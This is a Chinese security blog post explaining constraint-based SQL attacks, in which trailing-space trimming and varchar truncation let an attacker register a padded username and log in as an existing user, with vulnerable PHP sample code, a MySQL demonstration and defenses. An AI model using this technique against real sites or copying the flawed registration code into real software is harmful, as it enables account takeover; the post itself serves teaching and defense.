---
title: 基于约束的SQL攻击
date: 2021-05-14 10:30:00
tags: 
      - 网络安全
      - Web 安全
categories: 
- [网络安全, CTF]
- [网络安全, Web 安全]
---

sql 中 insert 和 select 对字符串处理方式的差异造成的漏洞

<!--more-->

## 1. 背景介绍
一个有趣的代码片段，开发者尝试各种方法来确保数据库的安全访问，当新用户尝试注册时，将运行以下代码：
```php
<?php
// Checking whether a user with the same username exists
$username = mysql_real_escape_string($_GET['username']);
$password = mysql_real_escape_string($_GET['password']);
$query = "SELECT *
          FROM users
          WHERE username='$username'";
$res = mysql_query($query, $database);
if($res) {
  if(mysql_num_rows($res) > 0) {
    // User exists, exit gracefully
    .
    .
  }
  else {
    // If not, only then insert a new entry
    $query = "INSERT INTO users(username, password)
              VALUES ('$username','$password')";
    .
    .
  }
}
```

使用以下代码验证登录信息：
```php
<?php
$username = mysql_real_escape_string($_GET['username']);
$password = mysql_real_escape_string($_GET['password']);
$query = "SELECT username FROM users
          WHERE username='$username'
              AND password='$password' ";
$res = mysql_query($query, $database);
if($res) {
  if(mysql_num_rows($res) > 0){
      $row = mysql_fetch_assoc($res);
      return $row['username'];
  }
}
return Null;
```

安全考虑:
> - 过滤用户输入参数了吗？ -- 完成检查
> - 使用单引号（'）来增加安全性了吗？ -- 完成检查

## 2. 攻击手法
在SQL中执行字符串处理时，字符串末尾的空格符将会被删除。换句话说“vampire”等同于“vampire ”，对于绝大多数情况来说都是成立的（诸如WHERE子句中的字符串或INSERT语句中的字符串）例如以下语句的查询结果，与使用用户名“vampire”进行查询时的结果是一样的。
```sql
SELECT * FROM users WHERE username='vampire     ';

等同于

SELECT * FROM users WHERE username='vampire';
```

也存在异常情况，最好的例子就是 LIKE 子句了。注意，对尾部空白符的这种修剪操作，主要是在“字符串比较”期间进行的。这是因为，SQL会在内部使用空格来填充字符串，以便在比较之前使其它们的长度保持一致。

> SQL Server follows the ANSI/ISO SQL-92 specification (Section 8.2, <Comparison Predicate>, General rules #3) on how to compare strings with spaces. The ANSI standard requires padding for the character strings used in comparisons so that their lengths match before comparing them. The padding directly affects the semantics of WHERE and HAVING clause predicates and other Transact-SQL string comparisons. For example, Transact-SQL considers the strings 'abc' and 'abc ' to be equivalent for most comparison operations.
> 
> The only exception to this rule is the LIKE predicate. When the right side of a LIKE predicate expression features a value with a trailing space, SQL Server does not pad the two values to the same length before the comparison occurs. Because the purpose of the LIKE predicate, by definition, is to facilitate pattern searches rather than simple string equality tests, this does not violate the section of the ANSI SQL-92 specification mentioned earlier.
>
> https://support.microsoft.com/en-us/topic/inf-how-sql-server-compares-strings-with-trailing-spaces-b62b1a2d-27d3-4260-216d-a605719003b0

在所有的 INSERT 查询中，SQL都会根据 varchar(n) 来限制字符串的最大长度。也就是说，如果字符串的长度大于“n”个字符的话，那么仅使用字符串的前“n”个字符。比如特定列的长度约束为“5”个字符，那么在插入字符串“vampire”时，实际上只能插入字符串的前5个字符，即“vampi”。

而攻击就是利用 select 与 insert 对长度和空格处理方式不同造成的漏洞。

select 语句对于参数后面空格的处理是删除，insert 只是截取最大长度的字符串，然后插入数据库。

假设最大长度限制为25 我们输入用户名为 admin[20个空格]1,密码随意。在本文一开始的代码逻辑中，select 检查的时候实际用的是 admin1，这时数据库中是不存在 admin1 的，（假设数据库中已经存在 admin），所以会执行 insert 操作。

但由于 select 与 insert 机制不同，insert 会直接截断，插入的是 admin[20个空格]，由于 SQL 处理字符串的机制，实际插入的就变成了 admin，这样库中就插入了两条 admin。


## 3. 攻击演示
现在，让我们建立一个测试数据库来演示具体攻击过程。
```shell
vampire@linux:~$ mysql -u root -p
mysql> CREATE DATABASE testing;
Query OK, 1 row affected (0.03 sec)
mysql> USE testing;
Database changed
```

接着创建一个数据表users，其包含username和password列，并且字段的最大长度限制为25个字符。然后，我将向username字段插入“vampire”，向password字段插入“my_password”。
```shell
mysql> CREATE TABLE users (
    ->   username varchar(25),
    ->   password varchar(25)
    -> );
Query OK, 0 rows affected (0.09 sec)
mysql> INSERT INTO users
    -> VALUES('vampire', 'my_password');
Query OK, 1 row affected (0.11 sec)
mysql> SELECT * FROM users;
+----------+-------------+
| username | password    |
+----------+-------------+
| vampire  | my_password |
+----------+-------------+
1 row in set (0.00 sec)
```

为了展示尾部空白字符的修剪情况，我们可以键入下列命令：
```shell
mysql> SELECT * FROM users
    -> WHERE username='vampire       ';
+----------+-------------+
| username | password    |
+----------+-------------+
| vampire  | my_password |
+----------+-------------+
1 row in set (0.00 sec)
```

现在我们假设一个存在漏洞的网站使用了前面提到的PHP代码来处理用户的注册及登录过程。为了侵入任意用户的帐户（在本例中为“vampire”），只需要使用用户名“vampire[许多空白符]1”和一个随机密码进行注册即可。对于选择的用户名，前25个字符应该只包含vampire和空白字符，这样做将有助于绕过检查特定用户名是否已存在的查询。
```shell
mysql> SELECT * FROM users
    -> WHERE username='vampire                   1';
Empty set (0.00 sec)
```

需要注意的是，在执行SELECT查询语句时，SQL是不会将字符串缩短为25个字符的。因此，这里将使用完整的字符串进行搜索，所以不会找到匹配的结果。接下来，当执行INSERT查询语句时，它只会插入前25个字符。
```shell
mysql>   INSERT INTO users(username, password)
    -> VALUES ('vampire                   1', 'random_pass');
Query OK, 1 row affected, 1 warning (0.05 sec)
mysql> SELECT * FROM users
    -> WHERE username='vampire';
+---------------------------+-------------+
| username                  | password    |
+---------------------------+-------------+
| vampire                   | my_password |
| vampire                   | random_pass |
+---------------------------+-------------+
2 rows in set (0.00 sec)
```

现在我们检索“vampire”的，将返回两个独立用户。注意，第二个用户名实际上是“vampire”加上尾部的18个空格。现在，如果使用用户名“vampire”和密码“random_pass”登录的话，则所有搜索该用户名的SELECT查询都将返回第一个数据记录，也就是原始的数据记录。这样的话，攻击者就能够以原始用户身份登录。这个攻击已经在MySQL和SQLite上成功通过测试。我相信在其他情况下依旧适用。

## 4. 防护手段
1. 将要求或者预期具有唯一性的那些列加上UNIQUE约束。
   > 实际上这是一个涉及软件开发的重要规则，即使你的代码有维持其完整性的功能，也应该恰当的定义数据。由于'username'列具有UNIQUE约束，所以不能插入另一条记录。将会检测到两个相同的字符串，并且INSERT查询将失败。

2. 最好使用'id'作为数据库表的主键。并且数据应该通过程序中的 id 进行跟踪

3. 为了更加安全，还可以用手动调整输入参数的限制长度（依照数据库设置）

————————————————
参考来源：
- [基于约束的SQL攻击](https://www.freebuf.com/articles/web/124537.html)，来自[FreeBuf.COM](https://www.freebuf.com/)
- [SQL Attack (Constraint-based)](https://dhavalkapil.com/blogs/SQL-Attack-Constraint-Based/)
- [基于约束的sql攻击](https://blog.csdn.net/weixin_41489908/article/details/108481692),来自[CSDN](https://www.csdn.net/)
- [基于约束的SQL攻击](https://www.k0rz3n.com/2017/06/03/passsignup/),来自[K0rz3n's Blog](https://www.k0rz3n.com/)